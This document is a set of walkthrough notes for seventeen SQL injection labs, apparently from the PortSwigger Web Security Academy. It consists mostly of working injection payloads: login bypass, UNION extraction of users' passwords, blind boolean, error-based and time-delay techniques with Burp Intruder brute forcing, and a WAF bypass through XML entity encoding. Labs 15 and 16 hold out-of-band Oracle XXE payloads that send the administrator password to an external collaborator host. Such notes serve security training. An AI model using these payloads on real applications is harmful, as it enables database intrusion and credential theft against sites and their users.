# Retrieving hidden data

## Lab - 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

```
GET /filter?category=Gifts'+OR+1%3d1-- HTTP/1.1
```

---

# Subverting application logic

## Lab - 2 : SQL injection vulnerability allowing login bypass

```
POST /login HTTP/1.1
...
csrf=1RBHY1YLKJyGP5nBXPAy4Xx7X2vznXr4&username=administrator%27--&password=safsf
```

---

# UNION ATTACK

## Lab - 3: SQL injection UNION attack, determining the number of columns returned by the query

`GET /filter?category=Gifts'+ORDER+BY+4-- HTTP/1.1` will get an error and the numbers of returning columns must be 3.

```
GET /filter?category=Gifts'+UNION+SELECT+NULL,+NULL,+NULL+-- HTTP/1.1
```

---

## Lab - 4: SQL injection UNION attack, finding a column containing text

`GET /filter?category=Tech+gifts'+ORDER+BY+4-- HTTP/1.1` will get an error.
`GET /filter?category=Tech+gifts'+UNION+SELECT+'a',NULL,NULL--` will get an erorr.

```
`GET /filter?category=Tech+gifts'+UNION+SELECT+NULL,'a',NULL--
```

---

## Lab - 5: SQL injection UNION attack, retrieving data from other tables

- The database contains a different table called `users`, with columns called `username` and `password`.
- Repeat the steps from above labs then find that there are 2 columns returning both with text columns

```
GET /filter?category=Gifts'+UNION+SELECT+username,password+FROM+users-- HTTP/1.1
```

---

## Lab - 6: SQL injection UNION attack, retrieving multiple values in a single column

- The database contains a different table called users, with columns called username and password.
- Repeat the steps from above labs and find that there are 2 columns in which second is the text column
- we need to extract 2 text columns, so

```
GET /filter?category=Gifts'+UNION+SELECT+NULL,username||'~'||password+FROM+users-- HTTP/1.1
```

---

# Examining the databases

## Lab - 7: SQL injection attack, querying the database type and version on Oracle

- Repeat the above step and find that there are 2 columns
- In Oracle database `UNION SELECT NULL,NULL` doesn't work
- Instead use `UNION SELECT NULL, NULL FROM dual`
- Both are text columns

```
GET /filter?category=Pets'+UNION+SELECT+'a',banner+FROM+v$version-- HTTP/1.1
```

---

## Lab - 8: SQL injection attack, querying the database type and version on MySQL and Microsoft

- `' ORDER BY 2--` doesn't work
- Instead use `' ORDER BY 2#` for comment

```
GET /filter?category=Lifestyle'+UNION+SELECT+@@version,NULL#
```

---

## Lab - 9: SQL injection attack, listing the database contents on non-Oracle databases

- There are 2 string datatype columns
- `GET /filter?category=Gifts'+UNION+SELECT+TABLE_SCHEMA,TABLE_NAME+FROM+information_schema.tables-- HTTP/1.1` will get the name of the user table

> table_name = 'users_xvzwev'

- `GET /filter?category=Gifts'+UNION+SELECT+COLUMN_NAME,DATA_TYPE+FROM+information_schema.columns+WHERE+table_name='users_xvzwev'-- HTTP/1.1`

> columns = password_otojxu , username_gfdqod

- `GET /filter?category=Gifts'+UNION+SELECT+password_otojxu,username_gfdqod+FROM+users_xvzwev-- HTTP/1.1`

will get the administrator password

---

## Lab - 10: SQL injection attack, listing the database contents on Oracle

- There are 2 string datatype columns returned
- `GET /filter?category=Pets'+UNION+SELECT+TABLE_NAME,'b'+FROM+all_tables-- HTTP/1.1`

> table_name = USERS_MZGWOV

- `GET /filter?category=Pets'+UNION+SELECT+COLUMN_NAME,'b'+FROM+all_tab_columns+WHERE+table_name='USERS_MZGWOV'-- HTTP/1.1`

> column_names = PASSWORD_HQOOJT, USERNAME_HIHHBB

- `GET /filter?category=Pets'+UNION+SELECT+USERNAME_HIHHBB,+PASSWORD_HQOOJT+FROM+USERS_MZGWOV-- HTTP/1.1`

- **In finding column names, single quote contains for table_name and no single quote for SELECT command**

---

# Blind SQL Injection

## Lab - 11: Blind SQL injection with conditional responses

- The database contains a different table called `users`, with columns called `username` and `password`

- This lab is vulnerable at `TrackingId`

```
GET /filter?category=Pets HTTP/1.1
Host: 0a2700230491d608c095ed200029003c.web-security-academy.net
Cookie: TrackingId=M1fXINMDA2LR2zH6'+AND+1=2--; session=r7hAOvwxNLrTPkJe1cBfOHPKEF5GFoUq
```

- will not return the `Welcome back message`.

```
GET /filter?category=Pets HTTP/1.1
Host: 0a2700230491d608c095ed200029003c.web-security-academy.net
Cookie: TrackingId=M1fXINMDA2LR2zH6'+AND+1=1--; session=r7hAOvwxNLrTPkJe1cBfOHPKEF5GFoUq
```

- return the `Welcome back message`

- check whether the table named `users` exists  
  `AND (select 'x' from users LIMIT 1)='x'--`

- check whether the username `administrator` exists  
   `AND (select username from users WHERE username='administrator')='administrator'--`

- enumerate length of password of administrator  
   `AND (select username from users WHERE username='administrator' AND LENGTH(password)>1)='administrator'--`

  - test with 2,3,4,5,... and find the length of the password

- find the administrator's password  
   `AND (select SUBSTRING(password,1,1) from users where username='administrator)='a'--`

  - use `cluster bomb` from intruder for two position

  1.  first number inside SUBSTRING function until the length of the password
  2.  character `='a'` with a-z1-9... etc

---

## Lab - 12: Blind SQL injection with conditional errors

- check the endpoints and not vulnerable to SQL injection except TrackingId
- test with `conditional responses` and no differences
- construct a subquery

  - `'||(SELECT '')||'--` => will get an error and try with
  - `'||(SELECT '' FROM dual)||'--` => return 200 and it is oracle database then check with other invalid table name
  - `'||(SELECT '' FROM invalid_name)||'--` => return 500 error

- check whether table name `users` exists

  - `'||(SELECT '' FROM users WHERE ROWNUM = 1)||'` => will not return an error and users table exists

- then check with conditional errors

  ```
  Cookie: TrackingId=bnSuW7tsA8qV5OrA'||(SELECT+CASE+WHEN+(1=2)+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+dual)||'--;
  ```

  will return no error but

  ```
  Cookie: TrackingId=bnSuW7tsA8qV5OrA'||(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+NULL+END+FROM+dual)||'--;
  ```

  will return error 500

- check username `adminstrator` exists

      ```
      TrackingId=bnSuW7tsA8qV5OrA'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'--
      ```

  > If `username='administrator'` exists in users table CASE WHEN will run and will results an error. If doesn't exists will not run and will not get an error.

- check the length of the password

  ```
  TrackingId=bnSuW7tsA8qV5OrA'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>1)||'--
  ```

- substring the password
  ```
  TrackingId=bnSuW7tsA8qV5OrA'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND SUBSTR(password,1,1)='a')||'--
  ```
  - then use `cluster bomb` from burp intruder for 2 position
    ```
    TrackingId=bnSuW7tsA8qV5OrA'||(SELECT+CASE+WHEN+(1%3d1)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username%3d'administrator'+AND+SUBSTR(password,§1§,1)%3d'§b§')||'--; session=qnTkIYUBPN2z392KooAu28hxbdfMgHGa
    ```

---

## Lab - 13: Blind SQL injection with time delays

- The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

```
Cookie: TrackingId=FoIQZWgYXI9gXlMR'%3bSELECT+pg_sleep(10)--;
```

---

## Lab - 14: Blind SQL injection with time delays and information retrieval

- The database contains a different table called `users`, with columns called `username` and `password`.

- Repeat above steps and found that it is PostgreSQL database and vulnerable to time delay injection at TrackingId parameter

- ```
  Cookie: TrackingId=JnyshbWFVfxR22KS'%3bSELECT+CASE+WHEN+(1%3d1)+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END--;
  ```

- Find the length of the password

```
Cookie: TrackingId=JnyshbWFVfxR22KS'%3bSELECT+CASE+WHEN+((SELECT+LENGTH(password)+FROM+users+WHERE+username+%3d+'administrator')>1)+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--;
```

and found that it has 19 characters

- use intruder and find the password of the administrator

```
Cookie: TrackingId=JnyshbWFVfxR22KS'%3bSELECT+CASE+WHEN+((SELECT+SUBSTRING(password,1,1)+FROM+users+WHERE+username+%3d+'administrator')%3d'a')+THEN+pg_sleep(5)+ELSE+pg_sleep(0)+END--;
```

- in intruder window, don't forget to select `Response received` column from Columns

---

## Lab - 15: Blind SQL injection with out-of-band interaction

```
|| (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://zmpjftuwme4wsr9drz9s8v4ozf57tw.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
```

---

## Lab - 16: Blind SQL injection with out-of-band data exfiltration

- The database contains a different table called `users`, with columns called `username` and `password`

- check in the Burp Collaborator

```
|| (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://5tzp6wnc0xg3ehq5kb79zl559wfm3b.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
```

- find the password of the administrator

```
|| (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username = 'administrator')||'.5tzp6wnc0xg3ehq5kb79zl559wfm3b.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual)--
```

---

## Lab 17: SQL injection with filter bypass via XML encoding

- This lab contains a SQL injection vulnerability in its stock check feature. The results from the query are returned in the application's response, so you can use a UNION attack to retrieve data from other tables.

- The database contains a users table, which contains the usernames and passwords of registered users.

```
POST /product/stock HTTP/1.1
...

<?xml version="1.0" encoding="UTF-8"?>
  <stockCheck>
    <productId>1</productId>
    <storeId>1 </storeId>
  </stockCheck>
```

return

```
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Connection: close
Content-Length: 7

478 units
```

- Then check the math operation

```
POST /product/stock HTTP/1.1
...

<?xml version="1.0" encoding="UTF-8"?>
  <stockCheck>
    <productId>1</productId>
    <storeId>1+1 </storeId>
  </stockCheck>
```

return `512 units`

```
POST /product/stock HTTP/1.1
...

<?xml version="1.0" encoding="UTF-8"?>
  <stockCheck>
    <productId>1</productId>
    <storeId>1 UNION SELECT NULL </storeId>
  </stockCheck>
```

- WAF is blocked an `Attack detected`

- Install `Hackvertor` from BApp store
- Select the SQL phrase that is injected and right clicked > extensions > hackvector > encode > dec_entities
- Then send the request and error may not get

```
<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
  <productId>1</productId>
  <storeId>
    1
    <@dec_entities>UNION SELECT username || '~' || password FROM users<@/dec_entities>
  </storeId>
</stockCheck>
```

return

```
HTTP/1.1 200 OK
Content-Type: text/plain; charset=utf-8
Connection: close
Content-Length: 100

wiener~qxsgempqshgopn61p00q
administrator~z6876weegv4qgm5aef6o
carlos~1tx25i4p4ti21oap4jtf
478 units
```

---
